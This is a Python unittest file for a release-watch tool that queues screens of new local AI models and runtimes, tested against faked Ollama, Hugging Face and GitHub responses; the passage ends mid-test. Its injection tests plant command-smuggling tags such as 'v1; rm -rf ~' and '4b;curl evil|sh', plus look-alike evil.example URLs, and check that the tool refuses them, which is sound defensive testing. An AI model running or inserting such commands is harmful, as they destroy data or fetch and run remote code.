"""Release watch (localbench/releasewatch.py): candidate beads and queued screens from fake Ollama library, registry,
Hugging Face and GitHub responses. Every run uses a temp HOME and a fake `br`; nothing touches the network, beads or
launchd."""

from __future__ import annotations

import hashlib
import json
import plistlib
import shlex
import subprocess
import tempfile
import unittest
import urllib.parse
from datetime import UTC, datetime, timedelta
from pathlib import Path

from localbench import models
from localbench import releasewatch as rw

NOW = datetime(2026, 9, 30, 6, 17, tzinfo=UTC)
GB = 10**9


class World:
    """Fake upstreams, routed by URL the way the real endpoints are shaped. `down` lists URL prefixes that answer
    like a dead network (status 0)."""

    def __init__(self):
        # name -> tag -> (manifest key, weight bytes); tags sharing a key share one manifest (aliases).
        self.ollama = {"nimble": {"latest": ("nimble-9b", 6 * GB)},
                       "tev1": {"latest": ("tev1-4b", 4 * GB), "0.8b": ("tev1-08b", GB)},
                       "qwen3.8": {"27b-mlx": ("q38-27b", 17 * GB)},
                       "bge-m3": {"latest": ("bge-m3", GB)}}
        self.listed_only = ["llama4"]          # on the library page, out of every family
        self.hf = {"mlx-community": [("mlx-community/Qwen3.8-27B-4bit", "a" * 40, 15 * GB)],
                   "Qdrant": [("Qdrant/bge-base-en-v1.5-onnx-Q", "b" * 40, GB // 4)]}
        self.github = {"ollama/ollama": [("v0.35.0", False)], "ddalcu/mlx-serve": [("v26.9.6", False)],
                       "jundot/omlx": [("v0.7.0", False)]}
        self.mismatch: set[str] = set()        # manifest keys whose registry body differs from the library page
        self.html_url: dict[str, str] = {}     # tag -> release page URL override
        self.asset_url: dict[str, str] = {}    # tag -> mlx-serve asset URL override
        self.hf_dates: dict[str, str] = {}     # repo -> createdAt override (default: in-window 2026-09-29)
        self.hf_touched: dict[str, str] = {}   # repo -> lastModified override on the expanded query
        self.hf_nodates: set[str] = set()      # repos listed with no date at all
        self.hf_pipes: dict[str, str] = {}     # repo -> pipeline_tag override (default text-generation)
        self.hf_meta: dict[str, dict] = {}     # repo -> model-info overrides (siblings, tags, gated)
        self.down: list[str] = []
        self.calls: list[str] = []

    def manifest(self, key: str, size: int, served: bool = False) -> bytes:
        tail = "-repushed" if served and key in self.mismatch else ""
        return json.dumps({"schemaVersion": 2, "layers": [{"digest": f"sha256:{key}{tail}", "size": size}]}).encode()

    def digest12(self, key: str, size: int) -> str:
        return hashlib.sha256(self.manifest(key, size)).hexdigest()[:12]

    def tags_html(self, name: str) -> str:
        rows = []
        for tag, (key, size) in self.ollama[name].items():
            row = (f'<a href="/library/{name}:{tag}" class="md:hidden flex"><span>{name}:{tag}</span>'
                   f'<span class="font-mono"> {self.digest12(key, size)}</span> \u2022 {size / GB:.1f}GB \u2022 '
                   f'Text input</a>')
            rows += [row, row.replace('class="md:hidden flex"', 'class="hidden md:flex"')]
        rows.append(f'<a href="/library/{name}:cloud" class="md:hidden"><span>{name}:cloud</span> \u2022 -</a>')
        return "<html>" + "\n".join(rows) + "</html>"

    def __call__(self, url: str, headers: dict | None = None, timeout: float = 15) -> tuple[int, bytes]:
        self.calls.append(url)
        if any(url.startswith(p) for p in self.down):
            return 0, b""
        if url.startswith(rw.OLLAMA_LIBRARY + "?"):
            names = [*self.ollama, *self.listed_only]
            return 200, "".join(f'<a href="/library/{n}">{n}</a>' for n in names).encode()
        if url.startswith(rw.OLLAMA_LIBRARY + "/"):
            name = url[len(rw.OLLAMA_LIBRARY) + 1:].removesuffix("/tags")
            return (200, self.tags_html(name).encode()) if name in self.ollama else (404, b"")
        if url.startswith(models.REGISTRY + "/library/"):
            name, tag = url[len(models.REGISTRY) + 9:].split("/manifests/")
            key, size = self.ollama[name][tag]
            return 200, self.manifest(key, size, served=True)
        if url.startswith(models.HF_API + "?"):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
            author, search = q["author"][0], q.get("search", [""])[0].lower()
            if "expand[]" in q:
                # The expanded serializer carries only id + the expanded fields (verified live 2026-10-02).
                rows = [{"id": r, **({} if r in self.hf_nodates else
                                     {"lastModified": self.hf_touched.get(r, "2026-09-01T00:00:00.000Z")})}
                        for r, s, _ in self.hf.get(author, [])]
                return 200, json.dumps(rows).encode()
            rows = []
            for r, s, _ in self.hf.get(author, []):
                if search not in r.lower():
                    continue
                row = {"id": r, "sha": s, "pipeline_tag": self.hf_pipes.get(r, "text-generation")}
                if r not in self.hf_nodates:
                    row["createdAt"] = self.hf_dates.get(r, "2026-09-29T00:00:00.000Z")
                rows.append(row)
            return 200, json.dumps(rows).encode()
        if url.startswith(models.HF_API + "/"):
            repo = url[len(models.HF_API) + 1:].removesuffix("?blobs=true")
            for r, sha, size in (x for rows in self.hf.values() for x in rows):
                if r == repo:
                    meta = {"id": r, "sha": sha, "tags": ["license:apache-2.0"], "gated": False, "siblings": [
                        {"rfilename": "config.json", "size": 2000},
                        {"rfilename": "model-00001-of-00002.safetensors", "size": size - size // 2},
                        {"rfilename": "model-00002-of-00002.safetensors", "size": size // 2}]}
                    meta.update(self.hf_meta.get(r, {}))
                    return 200, json.dumps(meta).encode()
            return 404, b""
        if url.startswith(rw.GITHUB_API + "/"):
            repo, _, rest = url[len(rw.GITHUB_API) + 1:].partition("/releases")
            if rest:
                return 200, json.dumps([
                    {"tag_name": t, "prerelease": pre, "draft": False,
                     "html_url": self.html_url.get(t, f"https://github.com/{repo}/releases/tag/{t}"),
                     "assets": [{"name": rw.MLX_SERVE_ASSET, "browser_download_url": self.asset_url.get(
                         t, f"https://github.com/{repo}/releases/download/{t}/a.tgz")}]}
                    for t, pre in self.github[repo]]).encode()
            repo, tag = url[len(rw.GITHUB_API) + 1:].split("/commits/")
            return 200, json.dumps({"sha": hashlib.sha1(f"{repo}@{tag}".encode()).hexdigest()}).encode()
        return 404, b""


class FakeBr:
    def __init__(self, fail: bool = False):
        self.calls: list[list[str]] = []
        self.fail = fail

    def __call__(self, argv: list[str]) -> tuple[int, str, str]:
        self.calls.append(argv)
        if self.fail:
            return 1, "", "database is locked"
        return 0, f"kit-cand-{len(self.calls)}\n", "INFO fsqlite noise\n"

    def field(self, i: int, flag: str) -> str:
        argv = self.calls[i]
        return argv[argv.index(flag) + 1]


class Home:
    def __init__(self, sub: str = ""):
        self._tmp = tempfile.TemporaryDirectory()
        self.path = Path(self._tmp.name) / sub if sub else Path(self._tmp.name)
        self.path.mkdir(exist_ok=True)
        self.dir = self.path / ".localbench" / "watch"

    def run(self, world: World, br: FakeBr, **kw) -> dict:
        return rw.run_once(fetch=world, br=br, now=NOW, home=self.path, publishers=("mlx-community",), **kw)

    def digest(self, world: World, br: FakeBr, publishers=("google",), **kw) -> dict:
        return rw.digest_once(fetch=world, br=br, now=NOW, home=self.path, publishers=publishers, **kw)

    def files(self) -> dict[str, bytes | None]:
        names = ("seen.json", "queue.json")
        return {n: (self.dir / n).read_bytes() if (self.dir / n).exists() else None for n in names}

    def queue(self) -> list[dict]:
        path = self.dir / "queue.json"
        return json.loads(path.read_text())["entries"] if path.exists() else []

    def seen(self) -> dict:
        return json.loads((self.dir / "seen.json").read_text())["items"]

    def close(self):
        self._tmp.cleanup()


class WatchCase(unittest.TestCase):
    HOME_SUB = ""

    def setUp(self):
        self.home = Home(self.HOME_SUB)
        self.addCleanup(self.home.close)
        self.world = World()
        baseline = self.home.run(self.world, FakeBr())
        self.assertTrue(baseline["ok"], baseline["errors"])


class Baseline(unittest.TestCase):
    def test_first_run_records_everything_listed_without_filing_and_a_dead_network_writes_nothing(self):
        home = Home()
        self.addCleanup(home.close)
        dead, br = World(), FakeBr()
        dead.down = ["https://"]
        report = home.run(dead, br)
        self.assertFalse(report["ok"])
        self.assertTrue(report["errors"])
        self.assertEqual(home.files(), {"seen.json": None, "queue.json": None})

        report = home.run(World(), br)
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual(br.calls, [])
        self.assertEqual(report["filed"], [])
        self.assertEqual(home.queue(), [])
        # tev1 has two manifests; aliases and the cloud row are not separate items.
        self.assertEqual(report["baselined"], len(home.seen()))
        self.assertIn("ollama:tev1@" + World().digest12("tev1-4b", 4 * GB), home.seen())
        self.assertIn("github:ddalcu/mlx-serve@v26.9.6", home.seen())
        self.assertFalse(any(k.startswith("ollama:llama4") for k in home.seen()))


class NewRelease(WatchCase):
    def test_new_decision_family_files_one_bead_and_one_queue_entry_then_nothing_when_seen_again(self):
        self.world.ollama["tev2"] = {"latest": ("tev2-4b", 5 * GB), "4b": ("tev2-4b", 5 * GB)}
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual(len(br.calls), 1)
        entry, = self.home.queue()
        full = hashlib.sha256(self.world.manifest("tev2-4b", 5 * GB)).hexdigest()
        self.assertEqual((entry["bead"], entry["role"], entry["digest"], entry["size"]),
                         ("kit-cand-1", "decision", f"sha256:{full}", 5 * GB))
        self.assertEqual(entry["source"], "https://ollama.com/library/tev2:latest")
        self.assertEqual(entry["pull"], [["localbench", "pull", "ollama:tev2:latest"]])
        self.assertEqual(entry["screen"], ["localbench", "decision", "run", "ollama:tev2:latest",
                                           "--suite", rw.DECISION_SUITE, "--feature", rw.DECISION_FEATURE])
        desc = br.field(0, "--description")
        for needle in ("role: decision", "https://ollama.com/library/tev2:latest", f"sha256:{full}", "5.00 GB",
                       shlex.join(entry["screen"]), "never adopt"):
            self.assertIn(needle, desc)
        self.assertEqual(br.field(0, "--external-ref"), entry["source"])

        before = self.home.files()
        again = FakeBr()
        report = self.home.run(self.world, again)
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual((again.calls, report["filed"], report["deferred"]), ([], [], []))
        self.assertEqual(self.home.files(), before)

    def test_new_tag_of_a_baselined_family_is_a_candidate_but_a_new_alias_of_a_known_manifest_is_not(self):
        self.world.ollama["tev1"]["4b"] = ("tev1-4b", 4 * GB)
        self.world.ollama["tev1"]["4b-q4_K_M"] = ("tev1-4b-q4", 3 * GB)
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertEqual([e["id"] for e in report["filed"]],
                         ["ollama:tev1@" + self.world.digest12("tev1-4b-q4", 3 * GB)])
        self.assertIn("ollama:tev1:4b-q4_K_M", self.home.queue()[0]["screen"])

    def test_an_id_already_in_the_queue_is_not_filed_again_when_its_seen_record_was_lost(self):
        self.world.ollama["tev2"] = {"latest": ("tev2-4b", 5 * GB)}
        self.home.run(self.world, FakeBr())
        state = json.loads((self.home.dir / "seen.json").read_text())
        state["items"] = {k: v for k, v in state["items"].items() if not k.startswith("ollama:tev2")}
        (self.home.dir / "seen.json").write_text(json.dumps(state))
        br = FakeBr()
        self.home.run(self.world, br)
        self.assertEqual(br.calls, [])
        self.assertEqual(len(self.home.queue()), 1)

    def test_runtime_releases_stable_only_mlx_serve_queued_with_commit_ollama_filed_without_a_screen(self):
        self.world.github["ddalcu/mlx-serve"].insert(0, ("v26.9.7", False))
        self.world.github["jundot/omlx"].insert(0, ("v0.7.1rc1", False))
        self.world.github["ollama/ollama"][:0] = [("v0.35.2-rc0", True), ("v0.35.1", False)]
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual(sorted(e["id"] for e in report["filed"]),
                         ["github:ddalcu/mlx-serve@v26.9.7", "github:ollama/ollama@v0.35.1"])
        entry, = self.home.queue()
        self.assertEqual(entry["commit"], hashlib.sha1(b"ddalcu/mlx-serve@v26.9.7").hexdigest())
        d = self.home.path / ".localbench" / "mlx-serve-26.9.7"
        self.assertEqual(entry["screen"][-2:], ["--b-mlx-serve", str(d / "mlx-serve-macos-arm64" / "mlx-serve")])
        ollama, = [e for e in report["filed"] if e["id"].startswith("github:ollama")]
        self.assertEqual((ollama["status"], ollama["screen"]), ("filed", None))
        self.assertEqual(self.home.seen()["github:ollama/ollama@v0.35.1"]["outcome"], "filed")


class Bounds(WatchCase):
    def test_family_table_scope(self):
        for name, role in (("tev1", "decision"), ("tev2", "decision"), ("nimble", "decision"),
                           ("nimble2-mini", "decision"), ("tevatron", None), ("qwen3.8", "extraction"),
                           ("qwen3.8-flash-next", "extraction"), ("mlx-community/Qwen3.9-8B-4bit", "extraction"),
                           ("qwen3-embedding", None), ("qwen3-coder", None), ("qwen3-vl", None),
                           ("bge-m3", "embedding"), ("Qdrant/bge-base-en-v1.5-onnx-Q", "embedding"),
                           ("BAAI/BGE-VL-MLLM-S2", None), ("Alibaba-NLP/gte-multilingual-reranker-base", None),
                           ("nomic-embed-text", "embedding"), ("gte-qwen2", "embedding"), ("llama4", None),
                           ("mxbai-embed-large", None)):
            with self.subTest(name=name):
                self.assertEqual(rw.role_of(name), role)

    def test_out_of_scope_family_is_never_fetched_and_oversize_models_are_marked_seen_not_queued(self):
        self.world.listed_only.append("llama5")
        self.world.ollama["qwen3.9"] = {"8b": ("q39-8b", 6 * GB), "235b": ("q39-235b", 140 * GB)}
        self.world.ollama["llama5"] = {"latest": ("l5", 4 * GB)}
        self.world.hf["mlx-community"] += [("mlx-community/Qwen3.9-235B-A22B-4bit", "c" * 40, 130 * GB),
                                           ("mlx-community/Llama5-8B-4bit", "d" * 40, 5 * GB)]
        br = FakeBr()
        report = self.home.run(self.world, br, max_queued=5)
        self.assertTrue(report["ok"], report["errors"])
        self.assertFalse(any("llama5" in u.lower() for u in self.world.calls))
        self.assertEqual([e["id"] for e in report["filed"]],
                         ["ollama:qwen3.9@" + self.world.digest12("q39-8b", 6 * GB)])
        self.assertEqual(self.home.queue()[0]["screen"],
                         ["localbench", "ab", rw.SMOL_INCUMBENT, "ollama:qwen3.9:8b", *rw.SCREEN_AB])
        self.assertEqual(sorted(s["id"] for s in report["skipped"]),
                         ["hf:mlx-community/Qwen3.9-235B-A22B-4bit",
                          "ollama:qwen3.9@" + self.world.digest12("q39-235b", 140 * GB)])
        self.assertEqual(self.home.seen()["hf:mlx-community/Qwen3.9-235B-A22B-4bit"]["outcome"], "oversize")
        self.assertEqual(len(br.calls), 1)

        self.world.calls.clear()
        self.home.run(self.world, br, max_queued=5)
        self.assertEqual(len(br.calls), 1)
        self.assertFalse(any("manifests" in u or "blobs" in u for u in self.world.calls))

    def test_queue_cap_defers_without_marking_seen_and_files_once_the_window_takes_the_queue(self):
        self.world.ollama["qwen3.9"] = {"4b": ("q39-4b", 3 * GB), "8b": ("q39-8b", 6 * GB), "14b": ("q39-14b", 9 * GB)}
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertEqual((len(report["filed"]), len(report["deferred"])), (2, 1))
        self.assertEqual(len(self.home.queue()), rw.MAX_QUEUED)
        deferred = report["deferred"][0]["id"]
        self.assertNotIn(deferred, self.home.seen())

        report = self.home.run(self.world, br)
        self.assertEqual((len(br.calls), [d["id"] for d in report["deferred"]]), (2, [deferred]))

        queue = json.loads((self.home.dir / "queue.json").read_text())
        for e in queue["entries"]:
            e["status"] = "screened"
        (self.home.dir / "queue.json").write_text(json.dumps(queue))
        report = self.home.run(self.world, br)
        self.assertEqual([e["id"] for e in report["filed"]], [deferred])
        self.assertEqual(len(br.calls), 3)

    def test_unscreenable_candidates_are_filed_but_do_not_take_queue_slots(self):
        # The screenable one comes first and fills the one-slot queue; the embedding after it must still be filed.
        self.world.ollama["qwen3.9"] = {"4b": ("q39-4b", 3 * GB)}
        self.world.ollama["bge-m4"] = {"latest": ("bge-m4", GB)}
        br = FakeBr()
        report = self.home.run(self.world, br, max_queued=1)
        self.assertEqual(sorted(e["role"] for e in report["filed"]), ["embedding", "extraction"])
        self.assertEqual([e["role"] for e in self.home.queue()], ["extraction"])
        self.assertEqual(report["deferred"], [])


class Failures(WatchCase):
    def test_dead_network_changes_no_state_and_reports_errors(self):
        self.world.ollama["tev2"] = {"latest": ("tev2-4b", 5 * GB)}
        self.world.down = ["https://"]
        before = self.home.files()
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertFalse(report["ok"])
        self.assertGreaterEqual(len(report["errors"]), 3)
        self.assertEqual((br.calls, report["filed"]), ([], []))
        self.assertEqual(self.home.files(), before)

    def test_a_new_family_whose_tags_fail_stays_new_until_they_load(self):
        self.world.ollama["tev2"] = {"latest": ("tev2-4b", 5 * GB)}
        self.world.down = [f"{rw.OLLAMA_LIBRARY}/tev2/"]
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertFalse(report["ok"])
        self.assertEqual(br.calls, [])
        self.world.down = []
        report = self.home.run(self.world, br)
        self.assertEqual([e["id"] for e in report["filed"]], ["ollama:tev2@" + self.world.digest12("tev2-4b", 5 * GB)])

    def test_one_dead_source_does_not_hide_its_releases_once_it_is_back(self):
        self.world.hf["mlx-community"].append(("mlx-community/Qwen3.9-8B-4bit", "e" * 40, 5 * GB))
        self.world.down = [models.HF_API]
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertFalse(report["ok"])
        self.assertEqual(br.calls, [])
        self.world.down = []
        report = self.home.run(self.world, br)
        entry, = self.home.queue()
        self.assertEqual((entry["id"], entry["commit"], entry["size"]), ("hf:mlx-community/Qwen3.9-8B-4bit", "e" * 40,
                                                                          5 * GB))
        self.assertIn(f"mlx-serve:{self.home.path}/.mlx-serve/models/mlx-community/Qwen3.9-8B-4bit", entry["screen"])

    def test_br_failure_leaves_the_candidate_unseen_and_unqueued_for_the_next_run(self):
        self.world.ollama["tev2"] = {"latest": ("tev2-4b", 5 * GB)}
        report = self.home.run(self.world, FakeBr(fail=True))
        self.assertFalse(report["ok"])
        self.assertIn("database is locked", report["errors"][0])
        self.assertEqual(self.home.queue(), [])
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertEqual((len(br.calls), len(self.home.queue())), (1, 1))

    def test_registry_manifest_that_disagrees_with_the_library_page_is_an_error_not_a_candidate(self):
        self.world.ollama["tev2"] = {"latest": ("tev2-4b", 5 * GB)}
        self.world.mismatch.add("tev2-4b")
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertFalse(report["ok"])
        self.assertIn("is not the library page's", report["errors"][0])
        self.assertEqual((br.calls, self.home.queue()), ([], []))
        self.assertFalse(any(k.startswith("ollama:tev2") for k in self.home.seen()))

    def test_state_inside_a_git_work_tree_is_refused_before_anything_is_written(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / ".git").mkdir()
            br = FakeBr()
            report = rw.run_once(fetch=World(), br=br, now=NOW, home=Path(tmp), publishers=())
            self.assertFalse(report["ok"])
            self.assertIn("git work tree", report["errors"][0])
            self.assertFalse((Path(tmp) / ".localbench").exists())


class Injection(WatchCase):
    """Upstream names, tags and URLs reach queued commands and paths; the home has a space so quoting shows."""
    HOME_SUB = "my home"

    def test_upstream_strings_outside_the_safe_patterns_are_refused_never_fetched_filed_or_queued(self):
        self.world.github["ddalcu/mlx-serve"][:0] = [("v1; rm -rf ~", False), ("v26.9.8", False)]
        self.world.asset_url["v26.9.8"] = "https://evil.example/ddalcu/mlx-serve/releases/download/v26.9.8/a.tgz"
        self.world.github["ollama/ollama"].insert(0, ("v0.35.1", False))
        self.world.html_url["v0.35.1"] = "https://github.com.evil.example/ollama/ollama/releases/tag/v0.35.1"
        self.world.ollama["tev1"]["4b;curl evil|sh"] = ("tev1-evil", GB)
        br = FakeBr()
        report = self.home.run(self.world, br, max_queued=5)
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual((br.calls, report["filed"], self.home.queue()), ([], [], []))
        reasons = {s["id"]: s["reason"] for s in report["skipped"]}
        evil_tev1 = "ollama:tev1@" + self.world.digest12("tev1-evil", GB)
        self.assertEqual(set(reasons), {"github:ddalcu/mlx-serve@v1; rm -rf ~", "github:ddalcu/mlx-serve@v26.9.8",
                                        "github:ollama/ollama@v0.35.1", evil_tev1})
        self.assertTrue(reasons["github:ddalcu/mlx-serve@v1; rm -rf ~"].startswith("refused: unsafe tag"))
        self.assertTrue(reasons[evil_tev1].startswith("refused: unsafe tag"))
        self.assertTrue(reasons["github:ddalcu/mlx-serve@v26.9.8"].startswith("refused: unsafe asset url"))
        self.assertTrue(reasons["github:ollama/ollama@v0.35.1"].startswith("refused: unsafe url"))
        self.assertEqual({self.home.seen()[i]["outcome"] for i in reasons}, {"refused"})
        self.assertFalse(any("rm -rf" in u or "curl evil" in u or "/commits/" in u for u in self.world.calls))

        report = self.home.run(self.world, br, max_queued=5)
        self.assertEqual((br.calls, report["skipped"], report["errors"]), ([], [], []))

    def test_queued_commands_are_argv_lists_and_beads_show_them_shell_quoted(self):
        self.world.hf["mlx-community"].append(("mlx-community/Qwen3.9-8B-4bit", "e" * 40, 5 * GB))
        self.world.github["ddalcu/mlx-serve"].insert(0, ("v26.9.7", False))
        br = FakeBr()
        report = self.home.run(self.world, br, max_queued=5)
        self.assertTrue(report["ok"], report["errors"])
        by_id = {e["id"]: e for e in self.home.queue()}
        target = self.home.path / ".mlx-serve" / "models" / "mlx-community" / "Qwen3.9-8B-4bit"
        hf = by_id["hf:mlx-community/Qwen3.9-8B-4bit"]
        self.assertEqual(hf["pull"], [["localbench", "pull", "hf:mlx-community/Qwen3.9-8B-4bit", "--to", str(target)]])
        self.assertEqual(hf["screen"], ["localbench", "ab", rw.SMOL_INCUMBENT, f"mlx-serve:{target}", *rw.SCREEN_AB])
        d = self.home.path / ".localbench" / "mlx-serve-26.9.7"
        asset = "https://github.com/ddalcu/mlx-serve/releases/download/v26.9.7/a.tgz"
        self.assertEqual(by_id["github:ddalcu/mlx-serve@v26.9.7"]["pull"],
                         [["mkdir", "-p", str(d)], ["curl", "-fL", "-o", str(d / rw.MLX_SERVE_ASSET), asset],
                          ["tar", "-xzf", str(d / rw.MLX_SERVE_ASSET), "-C", str(d)]])
        desc = br.field([i for i, a in enumerate(br.calls) if "Qwen3.9" in a[a.index("--title") + 1]][0],
                        "--description")
        self.assertIn(f"Stage-1 screen: {shlex.join(hf['screen'])}", desc)
        self.assertIn(shlex.quote(f"mlx-serve:{target}"), desc)
        self.assertEqual(shlex.split(desc.split("Stage-1 screen: ", 1)[1].splitlines()[0]), hf["screen"])


class LaunchAgent(unittest.TestCase):
    def test_daily_agent_runs_one_pass_and_install_refuses_a_foreign_plist(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp)
            doc = rw.launchd_plist(home, "/py")
            self.assertEqual(doc["ProgramArguments"], ["/py", "-m", "localbench", "watch-releases", "--once"])
            self.assertEqual(set(doc["StartCalendarInterval"]), {"Hour", "Minute"})
            self.assertNotIn("StartInterval", doc)
            self.assertNotIn("KeepAlive", doc)
            calls = []

            def run(argv, **kw):
                calls.append(argv)
                return subprocess.CompletedProcess(argv, 0, "", "")

            path = rw.install_agent(home, "/py", run=run)
            self.assertEqual(plistlib.loads(path.read_bytes()), doc)
            self.assertEqual(calls[-1][:2], ["launchctl", "bootstrap"])
            path.write_bytes(plistlib.dumps({"Label": "com.example.other"}))
            calls.clear()
            with self.assertRaises(rw.WatchError):
                rw.install_agent(home, "/py", run=run)
            self.assertEqual(calls, [])
            self.assertEqual(plistlib.loads(path.read_bytes())["Label"], "com.example.other")


class Digest(WatchCase):
    PUBS = ("google", "Qwen")

    def make_world(self) -> World:
        world = World()
        world.hf["google"] = [("google/Gemma4-9B", "c" * 40, 9 * GB),
                              ("google/Gemma4-27B-MLX", "d" * 40, 20 * GB),
                              ("google/OldModel-7B", "e" * 40, 7 * GB),
                              ("google/PlainText-7B", "f" * 40, 7 * GB),
                              ("google/Huge-100B", "1" * 40, 50 * GB),
                              ("google/NoDates-7B", "2" * 40, 7 * GB),
                              ("google/PicGen-7B", "3" * 40, 7 * GB),
                              ("google/RewardRM-8B", "4" * 40, 8 * GB)]
        world.hf["Qwen"] = [("Qwen/Qwen3-8B-GGUF", "5" * 40, 8 * GB), ("Qwen/qwen3.8", "6" * 40, 17 * GB)]
        world.hf_dates["google/OldModel-7B"] = "2026-09-01T00:00:00.000Z"
        world.hf_nodates.add("google/NoDates-7B")
        world.hf_pipes["google/PicGen-7B"] = "text-to-image"
        world.hf_pipes["Qwen/Qwen3-8B-GGUF"] = "text-generation"
        world.hf_meta["Qwen/Qwen3-8B-GGUF"] = {
            "siblings": [{"rfilename": "config.json", "size": 2000},
                         {"rfilename": "qwen3-8b.gguf", "size": 8 * GB}],
            "tags": ["license:apache-2.0", "gguf"], "gated": False}
        world.hf_meta["google/RewardRM-8B"] = {
            "siblings": [{"rfilename": "config.json", "size": 2000},
                         {"rfilename": "model.safetensors", "size": 8 * GB}],
            "tags": ["license:gemma", "mlx"], "gated": True}
        world.ollama["judgebot"] = {"latest": ("judgebot-7b", 7 * GB)}
        return world

    def baseline(self, world: World, expect: int = 8) -> None:
        first = self.home.digest(world, FakeBr(), publishers=self.PUBS)
        self.assertTrue(first["ok"], first["errors"])
        self.assertEqual(first["baselined"], expect)   # full world: 5 google + 2 Qwen + judgebot
        self.assertEqual(first["filed"], [])

    def test_baseline_prints_in_window_rows_and_replay_lists_seen_rows(self):
        world = self.make_world()
        first = self.home.digest(world, FakeBr(), publishers=self.PUBS)
        self.assertTrue(first["ok"], first["errors"])
        self.assertEqual(first["filed"], [])
        rows = {r["id"]: r for r in first["rows"]}
        self.assertIn("hf:google/Gemma4-9B", rows)
        self.assertEqual((rows["hf:google/Gemma4-9B"]["role"],
                          rows["hf:google/Gemma4-9B"]["formats"],
                          rows["hf:google/Gemma4-9B"]["license"]),
                         ("generation", [], "apache-2.0"))
        normal = self.home.digest(world, FakeBr(), publishers=self.PUBS)
        self.assertEqual((normal["filed"], normal["rows"]), ([], []))
        replay = self.home.digest(world, FakeBr(), publishers=self.PUBS, replay_window=True)
        self.assertTrue(replay["ok"], replay["errors"])
        self.assertEqual(replay["filed"], [])
        replay_rows = {r["id"]: r for r in replay["rows"]}
        self.assertIn("hf:google/Gemma4-9B", replay_rows)
        self.assertEqual(replay_rows["hf:google/Gemma4-9B"]["outcome"], "already handled")

    def test_replay_lists_filed_candidate_without_refiling_or_state_change(self):
        world = self.make_world()
        self.baseline(world)
        world.hf["google"].append(("google/Gemma4-70B-MLX", "7" * 40, 30 * GB))
        world.hf_meta["google/Gemma4-70B-MLX"] = {"siblings": [{"rfilename": "model.safetensors", "size": 30 * GB}],
                                                        "tags": ["license:apache-2.0"], "gated": False}
        first = self.home.digest(world, FakeBr(), publishers=self.PUBS)
        self.assertEqual([e["id"] for e in first["filed"]], ["hf:google/Gemma4-70B-MLX"])
        before = self.home.files()
        br = FakeBr()
        replay = self.home.digest(world, br, publishers=self.PUBS, replay_window=True)
        self.assertTrue(replay["ok"], replay["errors"])
        self.assertEqual((br.calls, replay["filed"]), ([], []))
        self.assertEqual(self.home.files(), before)
        row = next(r for r in replay["rows"] if r["id"] == "hf:google/Gemma4-70B-MLX")
        self.assertEqual(row["outcome"], "already handled")

    def test_oversize_candidate_is_printed_with_detail_without_being_seen(self):
        world = self.make_world()
        self.baseline(world)
        name = "Qwen/Qwen3-8B-New-GGUF"
        world.hf["Qwen"].append((name, "9" * 40, 8 * GB))
        world.hf_pipes[name] = "feature-extraction"
        world.hf_meta[name] = {"siblings": [{"rfilename": "new.gguf", "size": 8 * GB}],
                               "tags": ["license:apache-2.0", "gguf"], "gated": False}
        report = self.home.digest(world, FakeBr(), publishers=self.PUBS, max_bytes=GB)
        row = next(r for r in report["rows"] if r["id"] == "hf:" + name)
        self.assertTrue(row["outcome"].startswith("oversize:"))
        self.assertEqual((row["size"], row["formats"], row["role"]), (8 * GB, ["GGUF"], "embedding"))
        self.assertEqual(self.home.seen()["hf:" + name]["outcome"], "oversize")

    def test_baseline_then_new_models_filed_with_screen_titles_and_spec_skeletons(self):
        world = self.make_world()
        self.baseline(world)
        world.hf["google"].append(("google/Gemma4-70B-MLX", "7" * 40, 30 * GB))
        world.hf["google"].append(("google/Zeta-7B", "8" * 40, 7 * GB))
        world.hf_meta["google/Zeta-7B"] = {
            "siblings": [{"rfilename": "config.json", "size": 2000},
                         {"rfilename": "zeta-7b.gguf", "size": 7 * GB}],
            "tags": ["license:apache-2.0"], "gated": False}
        br = FakeBr()
        second = self.home.digest(world, br, publishers=self.PUBS)
        self.assertTrue(second["ok"], second["errors"])
        self.assertEqual([e["id"] for e in second["filed"]],
                         ["hf:google/Gemma4-70B-MLX", "hf:google/Zeta-7B"])
        entry = second["filed"][0]
        self.assertEqual(entry["status"], "filed")   # generation has no screen tier: filed, not queued
        titles = [c[c.index("--title") + 1] for c in br.calls]
        self.assertIn("screen google/Gemma4-70B-MLX for generation", titles)
        self.assertIn("screen google/Zeta-7B for generation", titles)
        spec = entry["row"]["spec"]
        self.assertEqual((spec["kind"], spec["stage"], spec["candidates"], spec["assertions"]),
                         ("generation", "screen", [{"route": "hf:google/Gemma4-70B-MLX"}], []))
        rows = {r["id"]: r for r in second["rows"]}
        self.assertEqual(rows["hf:google/Gemma4-70B-MLX"]["license"], "apache-2.0")
        self.assertEqual(rows["hf:google/Zeta-7B"]["formats"], ["GGUF"])
        self.assertTrue(rows["hf:google/Zeta-7B"]["new_family"])
        self.assertFalse(rows["hf:google/Gemma4-70B-MLX"]["new_family"])
        self.assertEqual(second["rows"][0]["id"], "hf:google/Zeta-7B")
        self.assertIn("NEW FAMILY hf:google/Zeta-7B", "\n".join(rw.digest_lines(second)))

    def test_old_undated_and_wrong_pipeline_models_are_never_filed(self):
        world = self.make_world()
        world.hf["google"] = [r for r in world.hf["google"] if r[0] in
                              ("google/OldModel-7B", "google/NoDates-7B", "google/PicGen-7B")]
        home = Home("stale")
        self.addCleanup(home.close)
        first = home.digest(world, FakeBr(), publishers=("google",))
        self.assertTrue(first["ok"], first["errors"])
        self.assertEqual((first["filed"], first["undated"]), ([], 1))
        second = home.digest(world, FakeBr(), publishers=("google",))
        self.assertTrue(second["ok"], second["errors"])
        self.assertEqual((second["filed"], second["skipped"], second["undated"]), ([], [], 1))

    def test_stale_model_added_after_baseline_is_dropped_not_filed(self):
